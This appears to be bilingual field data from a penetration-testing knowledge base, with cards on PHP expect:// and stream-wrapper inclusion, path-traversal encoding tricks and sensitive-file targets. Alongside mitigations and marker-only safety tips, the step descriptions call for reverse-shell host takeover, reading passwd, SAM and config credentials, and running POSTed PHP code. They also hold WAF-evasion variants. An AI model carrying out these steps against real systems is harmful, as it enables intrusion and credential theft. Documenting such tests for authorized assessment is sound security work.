description.en: Insert a charset parameter to shift payload position; execution output returning confirms success.

description.zh: 绕过仅审计 base64 数据流的规则：直接明文短载荷；命令输出出现即成功。
description.en: Send a short plaintext payload where only base64 streams are audited; command output appearing confirms success.

name.zh: PHP Expect Wrapper 扩展边界

description.zh: 使用三个 expect:// 变体确认 PECL expect 扩展、注册 wrapper 与最终文件 API 是否共同形成命令流边界。
description.en: Uses three expect:// variants to determine whether the PECL expect extension, registered wrapper, and final file API jointly create a command-stream boundary.

subCategory.zh: PHP 流包装器与远程包含

overview.zh: PHP Expect Wrapper 扩展边界针对 PECL expect 扩展把流 URI 转为命令流的前提验证场景：expect:// 非默认 wrapper，测试首先是环境能力确认。验证三个 expect:// 变体与注册 wrapper 状态。
overview.en: The PHP expect-wrapper extension boundary targets preconditions for the PECL expect extension turning stream URIs into command streams: expect:// is not a default wrapper, so testing starts as an environment-capability check. It validates three expect:// variants and the registered wrapper state.

vulnerability.zh: 若应用允许用户控制流 URI，expect wrapper 已启用且 PHP 进程可启动命令，文件读取功能可能跨越到进程执行；仅安装扩展或返回 unknown wrapper 错误都不等于存在可利用数据流。
vulnerability.en: If the application lets users control stream URIs, the expect wrapper is enabled, and the PHP process can launch commands, file-reading functionality can cross into process execution; merely having the extension installed or an unknown-wrapper error does not equal an exploitable stream.

exploitation.zh: 按第 1 步保留三个原行作来源核对，实际执行统一替换为批准的 marker-helper（仅输出随机标记），逐条提交 expect://id、expect://ls 与读取类变体；命中判据为 marker-helper 的随机标记出现在响应中，证明 expect 扩展、wrapper 注册与流 API 三项前提同时成立。未命中时记录 PHP 版本、已注册 wrapper 清单与错误类型，区分扩展缺失、scheme 被拒与进程权限不足三种原因。
exploitation.en: Keep the three original lines from step 1 for source verification, but replace all execution with the approved marker-helper (emitting only a random marker), submitting expect://id, expect://ls, and read-style variants one by one; a hit is the marker-helper's random marker in the response, proving expect extension, wrapper registration, and stream API preconditions all hold. On a miss, record the PHP version, registered wrapper list, and error type to distinguish missing extension, rejected scheme, and insufficient process permissions.

mitigation.zh: 生产环境卸载或禁用 expect 扩展，拒绝非 file scheme，使用对象 ID 访问固定文件，并限制 PHP 进程创建子进程。修复后重放第 1 步变体，确认 expect URI 被拒绝且正常文件读取可用。
mitigation.en: Uninstall or disable the expect extension in production, reject non-file schemes, access fixed files via object IDs, and restrict child-process creation for PHP. After the fix, replay the step-1 variants and confirm expect URIs are rejected while normal file reads work.

description.zh: 确认目标PHP加载expect流包装器且参数进入文件类函数，提交无害探测得到异常或响应差异即判断wrapper可达。
description.en: Confirm the expect wrapper is loaded and the parameter reaches a file function; a distinct error or response delta means it is reachable.

title.en: Submit an expect command to confirm execution

description.zh: 用执行区载荷把参数指向expect://id，响应出现uid输出即确认命令经包装器在服务器上真实执行。
description.en: Point the parameter at expect://id per the execution payload; uid output confirms the wrapper executes commands server-side.

title.zh: 执行反弹命令建立通道
title.en: Fire a reverse command to open a channel

description.zh: 把expect命令换成连接控制端的shell语句，沿用第2步的参数形式提交，控制端收到会话即完成主机接管。
description.en: Swap the expect command for a reverse shell and resubmit as in step 2; the session at the controller owns the host.

prerequisites.zh: 隔离 PHP 实例明确安装 PECL expect，且 stream_get_wrappers 输出包含 expect
prerequisites.en: The isolated PHP instance explicitly has PECL expect installed and stream_get_wrappers lists expect.

prerequisites.zh: 运行身份仅能启动预先批准的无副作用标记程序，并可审计进程创建
prerequisites.en: The runtime identity can start only a preapproved side-effect-free marker program and process creation is auditable.

analysis.zh: 完整阳性必须出现由目标 PHP 请求启动的批准 marker-helper 进程及其唯一输出。wrapper 在列表中、URI 被解析、报错内容不同或命令字符串被记录只说明部分前提。
analysis.en: A complete positive requires the approved marker-helper process to be launched by the target PHP request and return its unique output. A listed wrapper, parsed URI, different error, or logged command string proves only a partial prerequisite.

opsecTips.zh: 只允许固定 marker-helper，设置一次执行和超时上限；发现任何其他子进程立即终止 PHP 测试实例
opsecTips.en: Allow only the fixed marker-helper with one-execution and timeout limits; terminate the PHP test instance immediately if any other child appears.

opsecTips.zh: 测试后卸载临时扩展、删除帮助程序和进程审计导出，并确认没有残留子进程
opsecTips.en: After testing remove the temporary extension, helper, and process-audit export, and confirm no child process remains.

description.zh: 绕过对 %20 与引号形态的匹配：空格用加号编码传递；命令输出返回即成功。
description.en: Encode spaces as plus signs against %20-oriented matching; returned command output confirms success.

description.zh: 绕过对裸命令串特征的检测：整体加引号改变词法形态；执行结果一致即成功。
description.en: Wrap the command in quotes to alter lexing while results stay identical; consistent execution output confirms success.

description.zh: 绕过对完整命令指纹与全量输出的检测：管道截取改变命令与输出形态；返回首段内容即成功。
description.en: Pipe through head to change both command fingerprint and output shape; the leading content returning confirms success.

name.zh: 路径遍历编码与分隔符变体
name.en: Path Traversal Encoding and Separator Variants

description.zh: 使用双重编码、过长 UTF-8、空字节、重复点段和反斜杠测试文件路径在多层解码后的根目录约束。
description.en: Uses double encoding, overlong UTF-8, null bytes, repeated dot segments, and backslashes to test root enforcement after multilayer path decoding.

overview.zh: 路径遍历编码与分隔符变体针对文件路径在多层解码后越过根目录约束的场景。验证双重编码、过长 UTF-8、空字节、重复点段与反斜杠在代理、框架与文件 API 各层的解码差异。
overview.en: Path traversal encoding and separator variants target file paths escaping root constraints after multi-layer decoding. It validates double encoding, overlong UTF-8, null bytes, repeated dot segments, and backslashes across proxy, framework, and file-API decoding layers.

vulnerability.zh: 根因是边界层在一次解码前过滤危险片段，而应用、路由器或文件库再次解码并折叠点段；若只检查字符串前缀而不比较规范绝对路径，编码分隔符和平台转换可能恢复父目录语义。
vulnerability.en: The root cause is boundary layers filtering dangerous segments before a single decode while applications, routers, or file libraries decode again and fold dot segments; checking string prefixes without comparing canonical absolute paths lets encoded separators and platform conversion restore parent-directory semantics.

exploitation.zh: 按第 1 步逐条把 ..\..\、双重编码、过长 UTF-8 与 %255c 变体替换进目标路径参数，并把系统文件改为隔离标记；命中判据为某一编码变体在目标解码后解析为 ../ 并返回标记文件内容。逐条记录代理、框架和文件 API 各层看到的解码值，定位过滤与解码发生的层；确认命中后以相同变体族在下载、包含等其他入口复测。
exploitation.en: Per step 1, substitute ..\..\, double-encoding, overlong UTF-8, and %255c variants into the target path parameter one by one, swapping system files for isolated markers; a hit is any encoded variant resolving to ../ after target decoding and returning marker-file content. Record the decoded values seen at proxy, framework, and file-API layers to locate where filtering and decoding happen; after a hit, retest the same variant family on other entries such as download and inclusion.

mitigation.zh: 用服务端对象 ID 映射文件而不是接受路径；必须处理路径时，完成全部解码后解析规范绝对路径，验证其严格位于固定根目录且不经符号链接越界，拒绝 NUL、未知编码和跨平台分隔符。修复后重放第 1 步全部变体与正常样例，确认遍历被拒绝且合法读取可用。
mitigation.en: Map files by server-side object ID instead of accepting paths; when paths must be handled, parse the canonical absolute path after completing all decoding, verify it lies strictly inside a fixed root without symlink escape, and reject NUL, unknown encodings, and cross-platform separators. After the fix, replay all step-1 variants and normal samples, confirming traversal is rejected while legitimate reads work.

description.zh: 寻找控制下载或读取的参数，提交合法文件名确认正常响应，掌握成功与失败响应差异即锁定测试入口。
description.en: Find the download/read parameter and submit a legal filename; knowing success versus failure shapes locks the entry.

title.en: Submit encoding variants one by one

description.zh: 用执行区载荷依次尝试双重编码、过度解码与分隔符变形的遍历串，任一变体返回目标文件内容即找到放行的编码路径。
description.en: Walk the double-encoded, over-decoded, and separator-mangled traversals from the execution payload; any variant returning content finds the gap.

title.zh: 用有效变体读取敏感文件
title.en: Read sensitive files with the working variant

description.zh: 以第2步成功的编码形式重构指向passwd、配置与日志的路径，逐个读取，收集到凭据即完成越界访问扩大。
description.en: Rebuild passwd, config, and log paths in the winning encoding; harvested credentials complete the out-of-root sweep.

prerequisites.zh: 目标参数参与服务端文件读取、下载、解压或模板路径选择
prerequisites.en: A target parameter controls server-side file read, download, extraction, or template selection.

prerequisites.zh: 测试根目录外准备无敏感标记文件并启用文件访问审计
prerequisites.en: A nonsensitive marker outside the test root and file-access auditing are available.

analysis.zh: 报告应同时给出原始值、完全解码值、规范绝对路径和实际文件操作。仅证明 WAF 与应用解码不同，还不能证明目录越界。
analysis.en: Report raw value, fully decoded value, canonical absolute path, and actual file operation. A WAF/application decoding difference alone does not prove directory escape.

opsecTips.zh: 所有敏感路径替换为隔离标记，禁止读取真实账户、日志和配置文件。
opsecTips.en: Replace every sensitive path with an isolated marker and do not read real account, log, or configuration files.

opsecTips.zh: 按目标平台选择有限变体并限速，避免大量无关错误污染日志。
opsecTips.en: Choose a small platform-specific set and rate-limit it to avoid irrelevant error-log noise.

name.zh: 敏感本地文件与应用配置路径
name.en: Sensitive Local File and Application Configuration Paths

description.zh: 按 Linux、Windows 与 Java Web 技术栈组织常见本地文件目标，用于确认文件读取边界及数据敏感度。
description.en: Organizes common Linux, Windows, and Java web local-file targets to confirm file-read boundaries and data sensitivity.

overview.zh: 敏感本地文件与应用配置路径针对文件读取边界确认后的影响评估场景：按 Linux、Windows 与 Java Web 技术栈组织常见本地文件目标。验证所选目标能否以应用权限返回内容特征。
overview.en: Sensitive local-file and application-configuration paths target impact assessment after a read boundary is confirmed: common local-file targets organized by Linux, Windows, and Java web stacks. It validates whether selected targets return content signatures under application privileges.

vulnerability.zh: 根因是文件读取接口允许用户选择任意绝对或应用相对路径，并以应用权限返回内容；日志可含令牌，web.xml 与 application.properties 可含内部路由或密钥，系统文件可暴露主机信息。
vulnerability.en: The root cause is a file-read interface letting users choose arbitrary absolute or application-relative paths and returning content with application privileges; logs may carry tokens, web.xml and application.properties may contain internal routes or keys, and system files expose host details.

exploitation.zh: 按第 1 步只选择与已确认操作系统和框架匹配的目标行（如 /proc/cpuinfo、Apache/Nginx 日志），优先把真实文件替换为同目录测试标记；命中判据为所选目标返回文件内容特征（如 hosts 的 localhost 行）或标记内容。确认读取后按目标类型评估敏感度并记录最小数据范围；不要无差别扫描全部路径，真实文件仅用于授权后的最小元数据确认。
exploitation.en: Per step 1, select only target lines matching the confirmed OS and framework (e.g., /proc/cpuinfo, Apache/Nginx logs), preferring same-directory test markers over real files; a hit is the selected target returning content signatures (such as the localhost line in hosts) or marker content. After confirming reads, assess sensitivity by target type and record the minimal data scope; never scan all paths indiscriminately—real files only for minimal metadata confirmation after authorization.

mitigation.zh: 将客户端输入映射到允许对象 ID，禁止绝对路径和任意相对路径；文件服务在最小权限沙箱中运行，不能读取应用配置与系统日志；对日志中的密钥脱敏并轮换任何已确认暴露的凭据。修复后重放第 1 步目标，确认越界路径被拒绝。
mitigation.en: Map client input to allowed object IDs and forbid absolute and arbitrary relative paths; run the file service in a least-privilege sandbox unable to read application configuration and system logs; mask secrets in logs and rotate any confirmed exposed credentials. After the fix, replay the step-1 targets and confirm out-of-bounds paths are rejected.

description.zh: 通过响应头、报错路径分隔符与指纹判断Linux或Windows，选定对应平台的目标清单，即确定读取优先级。
description.en: Judge Linux or Windows from headers, error separators, and fingerprints; the platform shortlist sets read priority.

description.zh: 用执行区载荷把读取参数指向hosts或win.ini等平台标识文件，返回localhost行或节段内容即确认读取原语稳定。
description.en: Point the read parameter at hosts or win.ini per the execution payload; localhost lines or section content confirm a stable primitive.

title.en: Pivot to logs and config files

description.zh: 沿用第2步的读取方式请求访问日志与中间件配置，拿到路径结构、口令与路由信息即为后续攻击铺路。
description.en: Reuse the step-2 read against access logs and middleware configs; paths, passwords, and routes pave the next attack.

prerequisites.zh: 已通过无敏感标记确认存在文件读取数据流
prerequisites.en: A file-read data flow has already been confirmed with a nonsensitive marker.

prerequisites.zh: 测试授权明确允许按平台核对敏感文件边界
prerequisites.en: Authorization explicitly permits platform-specific sensitive-file boundary checks.

analysis.zh: 该卡用于影响确认而非发现阶段。成功证据应最小化为文件存在、固定非敏感片段或审计事件，并说明应用身份的实际读取范围。
analysis.en: This card is for impact confirmation, not discovery. Minimize evidence to existence, a fixed nonsensitive fragment, or an audit event and state the actual read scope of the application identity.

opsecTips.zh: 不下载完整日志或配置；截图和报告中遮盖所有令牌、主机名和个人数据。
opsecTips.en: Do not download full logs or configuration; redact tokens, hostnames, and personal data from evidence.

opsecTips.zh: 每个平台只验证一个最低敏感目标，取得结论后立即停止。
opsecTips.en: Verify one lowest-sensitivity target per platform and stop as soon as the conclusion is established.

description.zh: 编码前缀绕过明文 ../。判据：读出 passwd。
description.en: Encoded prefix. Success: passwd read.

description.zh: proc 自指文件读取进程信息与凭据。判据：返回进程参数或环境变量。
description.en: proc self files leak process info. Success: args or env returned.

description.zh: 修复目录与注册表备份绕过在线文件锁。判据：SAM 内容返回。
description.en: Repair dir and registry backups bypass live locks. Success: SAM returned.

description.zh: 直取应用凭据配置。判据：返回连接串或密钥。
description.en: Directly grabs app credentials. Success: connection strings or keys returned.

name.zh: PHP Stream Wrapper 文件包含

description.zh: 使用 php、data、zip 与 phar wrapper 验证文件包含或读取参数是否允许非文件流、归档成员和序列化元数据进入 PHP 处理链。
description.en: Uses php, data, zip, and phar wrappers to test whether inclusion or read parameters admit nonfile streams, archive members, or serialization metadata into PHP processing.

subCategory.zh: PHP 流包装器与远程包含

overview.zh: PHP Stream Wrapper 文件包含针对文件包含或读取参数允许非文件流、归档成员和序列化元数据进入 PHP 处理链的场景。验证 php、data、zip 与 phar 四类 wrapper 的读取与包含行为差异。
overview.en: PHP stream-wrapper file inclusion targets inclusion or read parameters letting non-file streams, archive members, and serialized metadata into the PHP processing chain. It contrasts read versus include behavior across the php, data, zip, and phar wrappers.

vulnerability.zh: 根因是用户输入直接进入 fopen、file_get_contents、include 或归档 API，且未限制 wrapper scheme 和目标；读取函数可能泄露源码，include 可能解释流内容，phar/zip 还可能跨入归档成员或对象元数据处理。
vulnerability.en: The root cause is user input entering fopen, file_get_contents, include, or archive APIs directly without wrapper-scheme or target restrictions; read functions may leak source, include may interpret stream content, and phar/zip can additionally cross into archive members or object metadata handling.

exploitation.zh: 按第 1 步逐 wrapper、逐目标测试，并把系统文件、代码与归档全部替换为隔离的无害标记；先提交 php://filter base64 读取 marker 验证过滤器链，再测试 php://input、data:// 与 zip/phar 归档成员。命中判据为各 wrapper 按预期返回 base64 源码或执行内联流内容。注意 data: 与 data:// 是不同解析路径，分别提交；phar 命中时单独核对是否触发元数据处理。
exploitation.en: Test per wrapper and per target as in step 1, replacing all system files, code, and archives with isolated harmless markers; first submit php://filter Base64 reads against the marker to verify the filter chain, then test php://input, data://, and zip/phar archive members. A hit is each wrapper returning Base64 source or executing inline stream content as expected. Note that data: and data:// parse differently—submit both; on phar hits, separately check whether metadata processing triggers.

mitigation.zh: 不把用户输入传给 include/require；读取文件用服务端对象映射与固定根目录，只允许 file 资源；关闭不需要的 allow_url_include，上传目录不可执行，并审计 phar/zip 处理与反序列化路径。修复后重放第 1 步全部 wrapper。
mitigation.en: Never pass user input to include/require; read files via server-side object mapping with a fixed root, allowing only file resources; disable unneeded allow_url_include, keep upload directories non-executable, and audit phar/zip handling and deserialization paths. After the fix, replay all step-1 wrappers.

title.en: Confirm which file function is reached

description.zh: 区分参数进入读取还是包含函数，用普通路径与伪协议探测响应差异，确定sink类型即选择对应wrapper组合。
description.en: Tell whether the parameter hits a read or include function by probing paths and pseudo-protocols; the sink type picks the wrapper set.

title.en: Test stream wrappers one by one

description.zh: 用执行区载荷依次提交php://filter、php://input与data流，各wrapper按预期返回编码内容或执行结果即确认可用面。
description.en: Submit php://filter, php://input, and data streams per the execution payload; each behaving as expected maps the usable surface.

description.zh: 把参数设为php://input并在请求体POST一段PHP代码，页面执行结果回显即从文件读取升级为任意代码执行。
description.en: Set the parameter to php://input and POST PHP code in the body; execution output upgrades file read to arbitrary code execution.

prerequisites.zh: 目标由 PHP 处理并存在文件读取、包含或归档访问参数
prerequisites.en: The target runs PHP and exposes a file-read, include, or archive-access parameter.

prerequisites.zh: 可在隔离测试实例中控制无敏感资源和归档文件
prerequisites.en: Nonsensitive resources and archives are controllable in an isolated test instance.

analysis.zh: 应明确每行对应的 PHP API、配置前提与实际结果：源码读取、流解析、归档访问和代码解释是不同风险，不能合并评级。
